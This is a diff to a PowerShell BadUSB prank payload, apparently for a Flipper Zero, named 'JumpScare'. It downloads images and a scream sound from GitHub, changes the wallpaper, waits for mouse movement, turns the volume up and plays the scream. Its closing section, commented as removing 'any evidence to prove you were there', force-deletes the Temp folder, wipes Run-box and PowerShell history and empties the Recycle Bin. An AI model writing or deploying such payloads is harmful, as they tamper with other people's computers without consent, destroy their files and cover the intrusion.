@@ -1,4 +1,4 @@
-# Download Image
+# Download Images
 
 ## Fakeout cute image
 $image =  "https://raw.githubusercontent.com/Ta0hit/FlipperZero/refs/heads/main/RubberDucky-JumpScare/cat.png"
@@ -13,18 +13,13 @@ iwr $i -O $env:TMP\i.png
 iwr https://raw.githubusercontent.com/Ta0hit/FlipperZero/refs/heads/main/RubberDucky-JumpScare/jumpscare.png?dl=1 -O $env:TMP\i.png
 
 # Download WAV file
-
 $wav = "https://github.com/Ta0hit/FlipperZero/blob/main/RubberDucky-JumpScare/female_scream.wav?raw=true"
 $w = -join($wav,"?dl=1")
 iwr $w -O $env:TMP\s.wav
 
 #----------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This will take the image you downloaded and set it as your wallpaper
-#>
+# This will take the image downloaded and set it as the wallpaper
 
 Function Set-WallPaper {
  
@@ -104,21 +99,17 @@ public class Params
 }
  
 #----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
-#>
+ 
+# This is to pause the script until a mouse movement is detected
 
 function Pause-Script{
 Add-Type -AssemblyName System.Windows.Forms
 $originalPOS = [System.Windows.Forms.Cursor]::Position.X
 $o=New-Object -ComObject WScript.Shell
 
-    while (1) {
+    while(1) {
         $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+        if([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
             break
         }
         else {
@@ -128,15 +119,11 @@ $o=New-Object -ComObject WScript.Shell
 }
 
 #----------------------------------------------------------------------------------------------------
-<#
 
-.NOTES 
-	This is to play the WAV file
-#>
-
-function Play-WAV{
-$PlayWav=New-Object System.Media.SoundPlayer
-$PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
+# This is to play the WAV file
+function Play-WAV {
+    $PlayWav=New-Object System.Media.SoundPlayer
+    $PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
 }
 
 #----------------------------------------------------------------------------------------------------
@@ -154,8 +141,8 @@ for($i = 0; $i -lt $k; $i++) {
     $o.SendKeys([char] 175)  # Volume up key
 }
 
-
 #----------------------------------------------------------------------------------------------------
+
 Set-WallPaper -Image "$env:TMP\c.png" -Style Center
 Pause-Script
 Set-WallPaper -Image "$env:TMP\i.png" -Style Center
@@ -163,26 +150,18 @@ Play-WAV
 
 #----------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
+# This is to clean up and remove any evidence to prove you were there
 
 # Delete contents of Temp folder 
-
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
-
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
@@ -193,8 +172,7 @@ Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
 #If true, toggle CapsLock key, to ensure that the script doesn't fail
-if ($caps -eq $true){
-
+if ($caps -eq $true) {
 $key = New-Object -ComObject WScript.Shell
 $key.SendKeys('{CapsLock}')
 }
